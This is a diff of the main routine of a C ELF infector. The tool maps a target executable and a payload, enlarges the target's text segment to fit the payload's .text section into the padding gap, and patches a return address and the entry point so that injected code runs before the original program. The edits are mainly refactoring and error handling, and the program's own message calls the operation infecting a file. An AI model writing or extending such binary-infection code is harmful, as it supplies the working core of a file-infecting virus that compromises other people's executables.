@@ -16,7 +16,7 @@ int main(int argc, char *argv[])
     char *target_path, *payload_path;
     void *target_data, *payload_data;
 
-    Elf64_Ehdr* target_hdr;
+    Elf64_Ehdr *target_hdr;
     Elf64_Addr target_ep, target_base;
     Elf64_Phdr *target_text_seg;
     Elf64_Shdr *payload_text_sec;
@@ -25,7 +25,7 @@ int main(int argc, char *argv[])
 
     /* check args */
     if (argc != 3) {
-        log_errf("usage: %s target payload\n", argv[0]);
+        log_errf("usage: %s target payload", argv[0]);
         exit(1);
     }
 
@@ -34,14 +34,9 @@ int main(int argc, char *argv[])
     payload_path = argv[2];
 
     /* open files */
-    /* TODO: check that elf is of type EXEC */
     target_fd = open(target_path, O_APPEND | O_RDWR, 0);
-    if (target_fd < 0) {
-        log_perr("open");
-        exit(1);
-    }
     payload_fd = open(payload_path, O_APPEND | O_RDWR, 0);
-    if (payload_fd < 0) {
+    if (target_fd < 0 || payload_fd < 0) {
         log_perr("open");
         exit(1);
     }
@@ -50,13 +45,14 @@ int main(int argc, char *argv[])
     target_fd  = elfi_map(target_fd, &target_data, &target_fsize);
     payload_fd = elfi_map(payload_fd, &payload_data, &payload_fsize);
 
+    /* TODO: check that elf is of type EXEC */
+
     /* get target binary entry point */
     target_hdr = (Elf64_Ehdr *) target_data;
     target_ep = target_hdr->e_entry;
 
     log_infof("target entry point: %p", (void *) target_ep);
 
-    /* TODO: debug */
     /* elfi_dump_segments(target_hdr); */
 
     /* find executable segment and obtain offset and gap size */
@@ -67,14 +63,15 @@ int main(int argc, char *argv[])
 
     payload_text_sec = elfi_find_section(payload_data, ".text");
 
-    /* NOTE: Looks like we do not really have to patch the segment sizes */
+    /* NOTE: not necessary? */
     target_text_seg->p_filesz += payload_text_sec->sh_size;
     target_text_seg->p_memsz += payload_text_sec->sh_size;
 
     log_infof("payload .text section found at %lx (%lx bytes)",
               payload_text_sec->sh_offset, payload_text_sec->sh_size);
 
-    if (payload_text_sec->sh_size > gap_len) {
+    /* check size of payload vs gap */
+    if (payload_text_sec->sh_size > (unsigned long) gap_len) {
         log_errf("payload to big, cannot infect file");
         exit(1);
     }
@@ -90,6 +87,11 @@ int main(int argc, char *argv[])
                          RET_PATTERN, (long) target_ep);
     if (ret) {
         log_err("failed to patch return address");
+
+        close(target_fd);
+        close(payload_fd);
+
+        exit(1);
     }
 
     /* patch entry point */
